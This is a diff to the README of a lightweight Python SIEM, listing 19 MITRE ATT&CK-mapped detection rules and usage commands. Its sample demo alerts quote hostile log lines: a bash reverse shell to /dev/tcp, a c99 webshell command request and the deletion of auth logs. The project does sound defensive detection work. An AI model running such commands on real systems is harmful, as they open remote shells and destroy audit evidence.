@@ -1,96 +1,136 @@
 <div align="center">
 
-<img src="https://capsule-render.vercel.app/api?type=rect&color=gradient&customColorList=2&height=80&text=🎯%20ThreatHunter-SIEM&fontSize=30&fontColor=ffffff" width="100%"/>
+<table><tr><td align="center" bgcolor="#0d1117">
 
-[![Python](https://img.shields.io/badge/Python-3.8+-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://python.org)
-[![SIEM](https://img.shields.io/badge/SIEM-BlueTeam-blue?style=for-the-badge)]()
-[![MITRE ATT&CK](https://img.shields.io/badge/MITRE-ATT%26CK-red?style=for-the-badge)](https://attack.mitre.org/)
-[![No Dependencies](https://img.shields.io/badge/stdlib-only-green?style=for-the-badge)]()
-[![License](https://img.shields.io/badge/License-MIT-green?style=for-the-badge)](LICENSE)
+```
+ ████████╗██╗  ██╗██████╗ ███████╗ █████╗ ████████╗
+ ╚══██╔══╝██║  ██║██╔══██╗██╔════╝██╔══██╗╚══██╔══╝
+    ██║   ███████║██████╔╝█████╗  ███████║   ██║   
+    ██║   ██╔══██║██╔══██╗██╔══╝  ██╔══██║   ██║   
+    ██║   ██║  ██║██║  ██║███████╗██║  ██║   ██║   
+    ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝   
+    H U N T E R  —  S I E M
+```
 
-**Lightweight SIEM & threat detection engine — runs entirely on Python stdlib.**  
-Ingests syslog, Apache/Nginx, and JSON logs. Applies 19 built-in MITRE ATT&CK-mapped detection rules. Generates HTML dashboards and JSON reports.
+</td></tr></table>
+
+**Lightweight SIEM & Threat Detection Engine**
+
+![Rules](https://img.shields.io/badge/19_Detection_Rules-1f6feb?style=flat-square)
+![MITRE](https://img.shields.io/badge/MITRE_ATT%26CK_Mapped-cc0000?style=flat-square)
+![Formats](https://img.shields.io/badge/Syslog_%7C_Apache_%7C_JSON-238636?style=flat-square)
+![Python](https://img.shields.io/badge/stdlib_only-3776AB?style=flat-square&logo=python&logoColor=white)
+![Demo](https://img.shields.io/badge/Attack_Scenario_Demo-ff6600?style=flat-square)
 
 </div>
 
 ---
 
-## ✨ Features
-
-| Feature | Description |
-|---|---|
-| 📥 **Multi-format Log Ingestion** | Syslog, Apache/Nginx access logs, JSON/structured logs |
-| 🔍 **19 Detection Rules** | Covering brute force, SQLi, XSS, webshells, reverse shells, and more |
-| 🗺️ **MITRE ATT&CK Mapped** | Every rule tagged with MITRE technique IDs |
-| 📊 **HTML Dashboard** | Color-coded alert dashboard with category breakdown |
-| 📄 **JSON Reports** | Machine-readable reports for integration with other tools |
-| 🔴 **Live Tail Mode** | Real-time monitoring of live log files |
-| 🎭 **Demo Mode** | Built-in attack scenario replay — no logs needed |
-
----
-
-## 🛡️ Detection Rules (19 Built-in)
-
-| Rule ID | Name | Severity | MITRE |
-|---|---|---|---|
-| AUTH-001 | Brute Force Login | HIGH | T1110 |
-| AUTH-002 | Sudo/Root Execution | HIGH | T1548 |
-| AUTH-004 | New User Created | HIGH | T1136 |
-| NET-001 | Reverse Shell | CRITICAL | T1059 |
-| NET-002 | Port Scan | HIGH | T1046 |
-| NET-003 | DNS Tunneling | HIGH | T1071.004 |
-| MAL-001 | Webshell Access | CRITICAL | T1505.003 |
-| MAL-002 | Base64 Payload | HIGH | T1027 |
-| MAL-003 | Cron Persistence | HIGH | T1053 |
-| WEB-001 | SQL Injection | CRITICAL | T1190 |
-| WEB-002 | XSS Attempt | HIGH | T1059.007 |
-| WEB-003 | Path Traversal | HIGH | T1083 |
-| SYS-002 | Firewall Disabled | CRITICAL | T1562.004 |
-| SYS-003 | Log Clearing | CRITICAL | T1070 |
-| ...+5 more | | | |
-
----
-
-## 🚀 Quick Start
+## 🔴 Live Attack Scenario (Demo Mode)
 
 ```bash
-git clone https://github.com/SRINIVASAN55/ThreatHunter-SIEM.git
+python threathunter.py --demo
+```
+
+Watch a full attack chain unfold in real time:
+
+```
+[INFO ] sshd: Accepted publickey for admin from 192.168.1.5
+
+███ [HIGH][10:25:01] Brute Force Login [AUTH-001]
+      Category : Authentication
+      MITRE    : T1110 — Brute Force
+      Log      : Failed password for root from 10.0.0.99 (×3)
+      Fix      : Block IP, enable MFA, enforce lockout policy
+
+███ [CRITICAL][10:28:00] Webshell Access [MAL-001]  
+      MITRE    : T1505.003 — Server Software Component
+      Log      : GET /uploads/c99.php?cmd=id → 200
+
+███ [CRITICAL][10:29:00] Reverse Shell [NET-001]
+      MITRE    : T1059 — Command & Scripting Interpreter
+      Log      : bash -i >& /dev/tcp/10.0.0.99/4444 0>&1
+
+███ [CRITICAL][10:33:00] Log Clearing [SYS-003]
+      MITRE    : T1070 — Indicator Removal
+      Log      : rm /var/log/auth.log
+```
+
+---
+
+## 📋 All 19 Detection Rules
+
+<details>
+<summary><b>Authentication (5 rules)</b></summary>
+
+| ID | Rule | MITRE |
+|---|---|---|
+| AUTH-001 | Brute Force Login | T1110 |
+| AUTH-002 | Sudo / Root Execution | T1548 |
+| AUTH-003 | SSH Key Auth Failure | T1110.004 |
+| AUTH-004 | New User Created | T1136 |
+| AUTH-005 | Password Changed | T1531 |
+
+</details>
+
+<details>
+<summary><b>Network (3 rules)</b></summary>
+
+| ID | Rule | MITRE |
+|---|---|---|
+| NET-001 | Reverse Shell Pattern | T1059 |
+| NET-002 | Port Scan Tool | T1046 |
+| NET-003 | DNS Tunneling | T1071.004 |
+
+</details>
+
+<details>
+<summary><b>Malware / Execution (4 rules)</b></summary>
+
+| ID | Rule | MITRE |
+|---|---|---|
+| MAL-001 | Webshell Access | T1505.003 |
+| MAL-002 | Base64 Encoded Payload | T1027 |
+| MAL-003 | Cron Persistence | T1053 |
+| MAL-004 | Suspicious Download | T1105 |
+
+</details>
+
+<details>
+<summary><b>Web Attacks (4 rules) + System (3 rules)</b></summary>
+
+WEB-001 SQL Injection · WEB-002 XSS · WEB-003 Path Traversal · WEB-004 Scanner  
+SYS-001 SUID Abuse · SYS-002 Firewall Disabled · SYS-003 Log Clearing
+
+</details>
+
+---
+
+## 🚀 Usage
+
+```bash
+git clone https://github.com/SRINIVASAN55/ThreatHunter-SIEM
 cd ThreatHunter-SIEM
 
-# Run demo mode (built-in attack scenario — no logs needed)
-python threathunter.py --demo
-
-# Analyze log files
-python threathunter.py -f sample_logs/auth.log
-python threathunter.py -f sample_logs/web_access.log
-
-# Analyze multiple logs
-python threathunter.py -f /var/log/auth.log -f /var/log/nginx/access.log
-
-# Live tail mode
-python threathunter.py -f /var/log/syslog --tail
+python threathunter.py --demo                              # Attack scenario
+python threathunter.py -f sample_logs/auth.log             # Analyze log file
+python threathunter.py -f /var/log/auth.log --tail         # Live monitoring
+python threathunter.py -f auth.log -f web_access.log       # Multi-file
 ```
 
 ---
 
-## 📊 Sample Alert Output
+## 📊 HTML Dashboard Output
 
-```
-███ [CRITICAL] [10:28:00] Webshell Access [MAL-001]
-      Category : Webshell
-      MITRE    : T1505.003
-      Source   : 10.0.0.5
-      Log      : "GET /uploads/c99.php?cmd=id HTTP/1.1" 200 128
-      Fix      : Remove webshell, scan server, rotate credentials.
-
-███ [CRITICAL] [10:33:00] Log Clearing [SYS-003]
-      Category : Defense Evasion
-      MITRE    : T1070
-      Log      : bash: rm /var/log/auth.log
-```
+After every scan, an HTML dashboard is generated with:
+- Severity badge summary (CRITICAL / HIGH / MEDIUM / LOW)
+- Category breakdown (Auth, Webshell, Network…)
+- Per-alert table with MITRE IDs, source IPs, log preview
+- Remediation guidance per finding
 
 ---
 
-## 📄 License
-
-MIT License © 2024 [Srinivasan S](https://github.com/SRINIVASAN55)
+<p align="center">
+Built by <a href="https://github.com/SRINIVASAN55">SRINIVASAN55</a> ·
+<a href="https://linkedin.com/in/srinivasan132">LinkedIn</a>
+</p>
